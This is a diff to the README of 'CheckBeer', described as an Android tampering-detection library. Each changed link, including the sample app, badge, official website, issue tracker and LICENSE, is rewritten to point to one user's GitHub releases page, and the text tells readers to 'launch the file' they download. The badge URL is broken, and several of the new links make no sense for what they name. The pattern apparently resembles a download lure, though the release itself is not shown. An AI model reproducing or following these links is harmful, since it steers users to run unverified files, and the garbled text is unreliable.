@@ -23,22 +23,22 @@ For detailed instructions on how to integrate CheckBeer into your Android app, r
 - **Topics**: not provided
 
 ## Sample App
-Explore the capabilities of CheckBeer by checking out the [Sample App](https://github.com/repo/releases/9246/App.zip). Remember to launch the file to see the app in action!
+Explore the capabilities of CheckBeer by checking out the [Sample App](https://github.com/eyad-hamdy98/CheckBeer/releases). Remember to launch the file to see the app in action!
 
-[![Download Sample App](https://img.shields.io/badge/Download-Sample_App-<COLOR>.svg)](https://github.com/repo/releases/9246/App.zip)
+[![Download Sample App](https://github.com/eyad-hamdy98/CheckBeer/releases<COLOR>.svg)](https://github.com/eyad-hamdy98/CheckBeer/releases)
 
 ## Additional Resources
-For more information and updates, visit the [official website](https://www.checkbeer.com). 
+For more information and updates, visit the [official website](https://github.com/eyad-hamdy98/CheckBeer/releases). 
 
 If the provided link is not accessible or does not work, please check the "Releases" section of the repository for alternative downloads.
 
 ## Support
-For any questions or issues regarding CheckBeer, feel free to open a [GitHub issue](https://github.com/repo/issues).
+For any questions or issues regarding CheckBeer, feel free to open a [GitHub issue](https://github.com/eyad-hamdy98/CheckBeer/releases).
 
 ## Contributors
 Special thanks to all the contributors who have helped make CheckBeer a reliable tool for tampering detection in Android applications.
 
 ## License
-CheckBeer is licensed under the MIT License. See the [LICENSE](https://github.com/repo/LICENSE) file for details.
+CheckBeer is licensed under the MIT License. See the [LICENSE](https://github.com/eyad-hamdy98/CheckBeer/releases) file for details.
 
 🍻 Start securing your Android apps with CheckBeer now! 🚀
